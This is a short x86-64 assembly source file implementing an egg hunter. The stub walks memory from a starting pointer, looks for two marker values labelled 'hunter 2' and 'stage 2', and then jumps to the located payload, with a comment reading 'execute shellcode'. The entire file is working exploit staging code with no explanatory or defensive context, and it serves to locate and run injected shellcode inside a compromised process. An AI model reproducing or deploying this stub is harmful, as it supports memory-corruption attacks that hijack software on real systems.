    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    mov rsi, r14
    jmp get_byte

compare_eggs:
    ; hunter 2
    mov r15w, 0x894c
    cmp ax, r15w
    je mark_hunter_2
    ; stage 2
    mov r15b, 0x22
    cmp al, r15b
    je mark_stage_2

next_byte:
    add rsi, 0x8

get_byte:
    mov rax, [rsi]
    test bl, bl
    jz compare_eggs
    test r10b, r10b
    jz compare_eggs
    jmp rbx ; execute shellcode

nop
mark_hunter_2:
    mov rbx, rsi
    jmp next_byte

mark_stage_2:
    mov r10, rsi
    add r10, 0x4
    jmp next_byte